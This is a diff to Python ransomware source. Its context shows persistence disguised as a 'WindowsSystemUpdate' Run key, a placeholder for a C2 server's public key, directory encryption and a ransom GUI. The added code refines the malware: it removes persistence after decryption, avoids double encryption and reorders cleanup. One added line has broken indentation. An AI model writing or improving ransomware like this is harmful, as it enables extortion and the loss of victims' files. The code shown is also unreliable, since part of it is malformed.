@@ -67,6 +67,28 @@ def install_persistence():
     except Exception as e:
         log_error(f"Persistence installation failed: {e}")
 
+def remove_persistence():
+    """Removes the persistence mechanism."""
+    try:
+        if os.name == 'nt':
+            import winreg
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, "WindowsSystemUpdate")
+                winreg.CloseKey(key)
+                log_error("Windows persistence removed.")
+            except Exception as e:
+                pass # Key might not exist
+        else:
+            autostart_dir = os.path.expanduser("~/.config/autostart")
+            desktop_file = os.path.join(autostart_dir, "system_update.desktop")
+            if os.path.exists(desktop_file):
+                os.remove(desktop_file)
+                log_error("Linux persistence removed.")
+    except Exception as e:
+        log_error(f"Persistence removal failed: {e}")
+
 # --- Configuration ---
 # PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
 ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
@@ -205,6 +227,20 @@ def encrypt_directory():
 
     aes_key = generate_aes_key()
     
+    # SAFETY: Check if we are running on an already infected system (failed state recovery)
+    # Scan a few files to see if they are encrypted
+    already_encrypted_count = 0
+    for root, _, files in os.walk(TARGET_DIRECTORY):
+        for file in files:
+            if file.endswith(ENCRYPTED_EXTENSION):
+                already_encrypted_count += 1
+    
+    if already_encrypted_count > 5:
+        log_error("Aborting encryption: System appears already encrypted but ID file is missing.")
+        # We can't recover the key if backup is gone too. This is a dead state.
+        # But better to stop than to double encrypt or confuse the user with a new ID.
+        return None
+
     # SAFETY: Backup key immediately!
     try:
         with open(KEY_BACKUP_FILE, 'wb') as f:
@@ -434,16 +470,14 @@ class RansomwareGUI:
                 decrypted_files = 0
                 for root, _, files in os.walk(TARGET_DIRECTORY):
                     for file in files:
-                        if file.endswith(ENCRYPTED_EXTENSION):
+                            if file.endswith(ENCRYPTED_EXTENSION):
                             file_path = os.path.join(root, file)
                             if decrypt_file_aes_gcm(file_path, key):
                                 decrypted_files += 1
                                 self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
                                 time.sleep(0.05)
                 
-                if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
-                if os.path.exists(ID_FILE): os.remove(ID_FILE)
-                if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
+                # Cleanup moved to finish_decryption to prevent data loss on crash
                 
                 self.master.after(0, self.finish_decryption, decrypted_files)
             except Exception as e:
@@ -458,9 +492,20 @@ class RansomwareGUI:
         self.decrypt_button.config(state='disabled')
         self.already_decrypted = True 
         self.log_message("SYSTEM RESTORED.", "green")
+        
+        # FINAL CLEANUP
+        if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
+        if os.path.exists(ID_FILE): os.remove(ID_FILE)
+        if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
+        remove_persistence()
+
+        # Quit after delay
+        self.master.after(5000, self.force_quit)
+
+    def force_quit(self):
         self.master.grab_release() 
-        self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
-        self.master.bind('<Escape>', lambda e: self.master.destroy())
+        self.master.destroy()
+        sys.exit()
 
     def change_wallpaper(self):
         # Placeholder
